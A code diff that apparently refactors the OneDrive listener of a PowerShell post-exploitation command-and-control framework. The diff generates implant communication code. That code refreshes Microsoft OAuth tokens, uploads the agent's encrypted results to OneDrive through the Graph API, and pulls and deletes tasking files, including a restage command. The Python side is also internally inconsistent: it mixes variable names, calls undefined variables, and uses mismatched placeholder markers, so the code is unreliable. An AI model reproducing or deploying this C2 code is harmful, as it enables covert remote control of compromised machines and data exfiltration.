@@ -327,7 +327,17 @@ class Listener:
         else:
             print helpers.color("[!] Python agent not available for Onedrive")
 
-    def generate_comms(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
+    def generate_comms(self, listener_options, language=None, **kwargs):
+
+        deployed = "deployed" in kwargs
+        
+        client_id = listener_options['ClientID']['Value']
+        refresh_token = listener_options['RefreshToken']['Value']
+        staging_folder = listener_options['StagingFolder']['Value'].strip('/')
+        taskings_folder = listener_options['TaskingsFolder']['Value'].strip('/')
+        redirect_uri = listener_options['RedirectURI']['Value']
+        base_url = "https://graph.microsoft.com/v1.0"
+
 
         staging_key = listener_options['StagingKey']['Value']
         base_folder = listener_options['BaseFolder']['Value']
@@ -339,108 +349,135 @@ class Listener:
             return
 
         if language.lower() == "powershell":
-            #Function to generate a WebClient object with the required headers
-            token_manager = """
-    $Script:TokenObject = @{token="%s";refresh="%s";expires=(Get-Date).addSeconds(3480)};
-    $script:GetWebClient = {
+
+            listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"
+                     }}
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           taskURIs = profile.split('|')[0])
+
+
+            post_message = """
+
+    $Script:TokenObject{name} = @{{token="{token}";refresh="{refresh_token}";expires=(Get-Date).addSeconds(3480)}};
+    $script:GetWebClient{name} = {{
+        params($FixedParameters)
         $wc = New-Object System.Net.WebClient
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-        if($Script:Proxy) {
+        if($Script:Proxy) {{
             $wc.Proxy = $Script:Proxy;
-        }
-        if((Get-Date) -gt $Script:TokenObject.expires) {
+        }}
+        if((Get-Date) -gt $Script:TokenObject{name}.expires) {{
             $data = New-Object System.Collections.Specialized.NameValueCollection
-            $data.add("client_id", "%s")
+            $data.add("client_id", "{client_id}")
             $data.add("grant_type", "refresh_token")
             $data.add("scope", "files.readwrite offline_access")
-            $data.add("refresh_token", $Script:TokenObject.refresh)
-            $data.add("redirect_uri", "%s")
+            $data.add("refresh_token", $Script:TokenObject{name}.refresh)
+            $data.add("redirect_uri", "{redirect_uri}")
             $bytes = $wc.UploadValues("https://login.microsoftonline.com/common/oauth2/v2.0/token", "POST", $data)
             $response = [system.text.encoding]::ascii.getstring($bytes)
-            $Script:TokenObject.token = [regex]::match($response, '"access_token":"(.+?)"').groups[1].value
-            $Script:TokenObject.refresh = [regex]::match($response, '"refresh_token":"(.+?)"').groups[1].value
+            $Script:TokenObject{name}.token = [regex]::match($response, '"access_token":"(.+?)"').groups[1].value
+            $Script:TokenObject{name}.refresh = [regex]::match($response, '"refresh_token":"(.+?)"').groups[1].value
             $expires_in = [int][regex]::match($response, '"expires_in":([0-9]+)').groups[1].value
-            $Script:TokenObject.expires = (get-date).addSeconds($expires_in - 15)
-        }
-        $wc.headers.add("User-Agent", $script:UserAgent)
-        $wc.headers.add("Authorization", "Bearer $($Script:TokenObject.token)")
-        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
+            $Script:TokenObject{name}.expires = (get-date).addSeconds($expires_in - 15)
+        }}
+        $wc.headers.add("User-Agent", $FixedParameters[UserAgent])
+        $wc.headers.add("Authorization", "Bearer $($Script:TokenObject{name}.token)")
+        $Script:Headers.GetEnumerator() | ForEach-Object {{$wc.Headers.Add($_.Name, $_.Value)}}
         $wc
-    }
-            """ % (token, refresh_token, client_id, redirect_uri)
+    }}
 
-            post_message = """
-    $script:SendMessage = {
+    $script:SendMessage{name} = {{
         param($packets)
 
-        if($packets) {
+        if($packets) {{
             $encBytes = encrypt-bytes $packets
             $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
-        } else {
+        }} else {{
             $RoutingPacket = ""
-        }
+        }}
 
-        $wc = (& $GetWebClient)
-        $resultsFolder = "%s"
+        $wc = (& $script:GetWebClient{name})
+        $resultsFolder = "{base_folder}"
 
-        try {
-            try {
+        try {{
+            try {{
                 $data = $null
                 $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content")
-            } catch {}
+            }} catch {{}}
 
-            if($data -and $data.length -ne 0) {
+            if($data -and $data.length -ne 0) {{
                 $routingPacket = $data + $routingPacket
-            }
+            }}
 
-            $wc = (& $GetWebClient)
+            $wc = (& $script:GetWebClient{name})
             $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket)
-            $script:missedChecking = 0
-            $script:lastseen = get-date
-        }
-        catch {
-            if($_ -match "Unable to connect") {
-                $script:missedCheckins += 1
-            }
-        }
-    }
-            """ % ("%s/%s" % (base_folder, results_folder))
+        }}
+        catch {{
+        }}
+    }}
+#COMM_FUNCTION
+            """.format(name = listenerOptions["Name"]["Value"], result_folder = result_folder, client_id = client_id, redirect_uri = redirect_uri)
 
             get_message = """
-    $script:lastseen = Get-Date
-    $script:GetTask = {
-        try {
-            $wc = (& $GetWebClient)
+    $script:GetTask{name} = {{
+        params($FixedParameters)
+        try {{
+            $wc = (& $script:GetWebClient{name})
 
-            $TaskingsFolder = "%s"
-
-            #If we haven't sent a message recently...
-            if($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date)) {
-                (& $SendMessage -packets "")
-            }
-            $script:MissedCheckins = 0
+            $TaskingsFolder = "{taskings_folder}"
 
             $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt:/content")
 
-            if($data -and ($data.length -ne 0)) {
-                $wc = (& $GetWebClient)
+            if($data -and ($data.length -ne 0)) {{
+                $wc = (& $script:GetWebClient{name})
                 $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt", "DELETE", "")
-                if([system.text.encoding]::utf8.getString($data) -eq "RESTAGE") {
-                    Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA
-                }
+                if([system.text.encoding]::utf8.getString($data) -eq "RESTAGE") {{
+                    Start-Negotiate -T $script:TokenObject{name}.token -SK $SK -PI $PI -UA $UA
+                }}
                 $Data
-            }
-        }
-        catch {
-            if($_ -match "Unable to connect") {
-                $script:MissedCheckins += 1
-            }
-        }
-    }
-            """ % ("%s/%s" % (base_folder, taskings_folder))
+            }}
+        }}
+        catch {{
+        }}
+    }}
+#TASK_FUNC
+            """.format(name = listenerOptions["Name"]["Value"],taskings_folder  = taskings_folder)
 
-            return token_manager + post_message + get_message
+            if deployed:
+                return ( "$script:NewListenerDict = {};".format(listener_dict) +
+                        getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']) +
+                        sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+            else:
+                return (listener_dict,
+                        getTask.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']),
+                        sendMessage.format(ControlServers = updateServers, name = listenerOptions['Name']['Value']))
+
 
     def generate_agent(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
         """
@@ -460,21 +497,33 @@ class Listener:
         kill_date = listener_options['KillDate']['Value']
         b64_default_response = base64.b64encode(self.default_response())
 
+        #Should we generate for more than one listener?
+        if self.options['SupListeners']['Value'] != '':
+            listeners = self.options['SupListeners']['Value'].split(',')
+        else:
+            listeners = []
+
         if language == 'powershell':
             f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             agent_code = f.read()
             f.close()
 
-            comms_code = self.generate_comms(listener_options, client_id, token, refresh_token, redirect_uri, language)
-            agent_code = agent_code.replace("REPLACE_COMMS", comms_code)
+            # patch in the comms methods
+            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
+            agent_code = agent_code.replace('#LISTENER_DICT', commsCode[0])\
+                   .replace('#COMM_FUNCTION', commsCode[1])\
+                   .replace('#TASK_FUNCTION',commsCode[2])
+
+            #iterate through the listeners to retrieve options for each one and generate commCode
+            for l in listeners:
+                loadedlistener = loaded_listeners[active_listeners[l]["moduleName"]]
+                commsCode = loadedlistener.generate_comms(listenerOptions = active_listeners[l]['options'], language=language)
+                code = code.replace('#LISTENER_DICT', commsCode[0])\
+                       .replace('#COMM_FUNCTION', commsCode[1])\
+                       .replace('#TASK_FUNCTION',commsCode[2])
+
 
             agent_code = helpers.strip_powershell_comments(agent_code)
-
-            agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-            agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-            agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
-            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')
 
             if kill_date != "":
                 agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")
